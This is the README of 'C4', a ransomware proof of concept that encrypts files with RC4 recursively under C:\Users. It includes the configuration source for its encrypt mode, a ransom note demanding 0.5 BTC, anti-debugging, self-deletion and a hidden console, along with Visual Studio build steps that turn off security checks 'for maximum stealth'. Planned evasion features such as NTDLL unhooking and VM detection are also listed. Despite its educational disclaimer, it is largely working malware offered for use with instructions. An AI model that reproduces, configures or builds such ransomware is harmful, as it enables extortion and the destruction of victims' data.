# C4

#### Lightweight Ransomware POC with Built-in Anti-Analysis


> 🚨 **DISCLAIMER:**  
> This tool is provided **solely** for educational, research, and defensive-security purposes.  
> Do **not** run C4 against any system you do not own or have **explicit** permission to test.  
> Unauthorized or malicious use is **illegal** and the authors disclaim any liability for damages or legal consequences arising from misuse.


[![C4-logo.png](https://i.postimg.cc/jSxWFJ6d/C4-logo.png)](https://postimg.cc/qzFMtqZ9)


C4 is a ransomware proof-of-concept that weaponizes the Rivest Cipher 4 (RC4) to encrypt files in place. Compiled without the C runtime (CRT), its binary size stays under 15KB while retaining functionality like multithreading, anti-analysis, and optional self-deletion.

---

### Features


- Uses RC4 encryption in a recursive, multithreaded fashion to rapidly encrypt or decrypt files.  
- Targets files in a configurable list of directories, while skipping those with blacklisted extensions.  
- Can drop a ransom note with custom text once encryption completes.  
- Includes anti-debugging logic to terminate execution if a debugger is detected.  
- Optionally self-deletes the executable after finishing.  
- Supports a verbose mode to log every encrypted file and report total runtime.

---

### Usage

```powershell
.\c4.exe
```

No command-line arguments required. C4 will recurse each directory listed in the `g_Directories` global variable, encrypt eligible files, optionally drop a ransom note, then self-delete.

[![c4-demo-2.gif](https://i.postimg.cc/8cS0D1ZH/c4-demo-2.gif)](https://postimg.cc/WF5nwPLF)
---
### Configuration

Before building, you can tune C4's behavior by editing the globals at the top of `main.c`. Here's what to look for:

```c
#pragma section(".text", read, execute)
// TRUE = Encrypt; FALSE = Decrypt
__declspec(allocate(".text")) BOOL   g_EncryptMode       = TRUE;

// TRUE = Drop a ransom note (g_Note)
__declspec(allocate(".text")) BOOL   g_RansomMode        = TRUE;

// TRUE = Hide the console window
__declspec(allocate(".text")) BOOL   g_HideConsole       = TRUE;

// TRUE = Exit immediately if a debugger is detected
__declspec(allocate(".text")) BOOL   g_AntiDebug         = TRUE;

// TRUE = Self-delete the EXE after finishing
__declspec(allocate(".text")) BOOL   g_SelfDelete        = TRUE;

// TRUE = Print each file encrypted, errors, and total runtime
__declspec(allocate(".text")) BOOL   g_Verbose           = FALSE;

// List of directories to process - final entry **must** be NULL
__declspec(allocate(".text")) LPCWSTR g_Directories[]    = {
    L"C:\\Users",
    NULL
};

// Ransom note text that will be written when g_RansomMode == TRUE
__declspec(allocate(".text")) const char* g_Note =
    "YOUR FILES HAVE BEEN ENCRYPTED BY C4.EXE\r\n"
    "This is not a joke. Want your data restored?\r\n"
    "Send 0.5 BTC to the address below:\r\n"
    "1MockBTCAddrxxxxxxxxxxxxxxxx\r\n"
    "You have 48 hours.\r\n";

// File extensions to skip (include the dot)
LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {
    ENCRYPT_EXT_W,
    L".exe", L".dll", L".sys", L".ini", 
    L".conf", L".cfg", L".reg", L".dat", 
    L".bat", L".cmd"
};
```

---

### Build

**Visual Studio**  
1. Open `C4.sln` in Visual Studio  
2. Set **Configuration** to `Release` and **Platform** to `x64`  
3. Go to **Project → Properties** and configure:  
   - **C/C++ → Code Generation → Runtime Library:** Multi-threaded (/MT)  
   - **C/C++ → Code Generation → Enable C++ Exceptions:** No  
   - **C/C++ → Code Generation → Security Check:** Disable Security Check (/GS-)
   - **C/C++ → Code Generation → Basic Runtime Checks:** Default  
   - **C/C++ → General → SDL checks:** No (/sdl-)  
   - **C/C++ → Optimization → Whole Program Optimization:** No  
   - **Linker → Debugging → Generate Debug Info:** No  
   - **Linker → Manifest → Generate Manifest:** No  
   - **Linker → Input → Ignore All Default Libraries:** Yes (/NODEFAULTLIB)  
   - **Linker → Advanced → Entry Point:** `main`  
   - **Linker → System → Subsystem:** Windows – hides the console for maximum stealth (switch to Console subsystem if you need to see output in verbose mode)
4. Build the solution.

---

### To-Do

    Add NTDLL unhooking

    Add virtual machine detection
